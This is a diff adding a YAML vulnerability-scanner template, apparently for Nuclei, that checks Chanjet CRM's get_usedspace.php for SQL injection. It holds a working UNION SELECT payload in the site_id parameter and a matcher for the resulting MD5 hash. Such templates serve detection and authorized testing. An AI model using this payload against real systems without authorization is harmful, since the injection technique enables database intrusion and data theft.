@@ -1,0 +1,22 @@
+id: chanjet-CRM-sqli
+info:
+  author: Str1am
+  name: "\u7545\u6377CRM \u7BA1\u7406\u7CFB\u7EDF get_usedspace.php \u6587\u4EF6 SQL\u6CE8\
+    \u5165\u6F0F\u6D1E"
+  reference: https://github.com/luck-ying/Library-POC/blob/77a6d512e04ace5117a161bb2fdd0c77790d34ff/Goby%26poc/chanjet_CRM_get_usedspace.php_sql_injection.json
+  severity: high
+  tags: chanjet,sqli
+requests:
+- matchers:
+  - status:
+    - 200
+    type: status
+  - condition: and
+    part: body
+    type: word
+    words:
+    - 202cb962ac59075b964b07152d234b70
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/webservice/get_usedspace.php?site_id=-1%20and%201=2%20union%20all%20select%20(md5(123))'
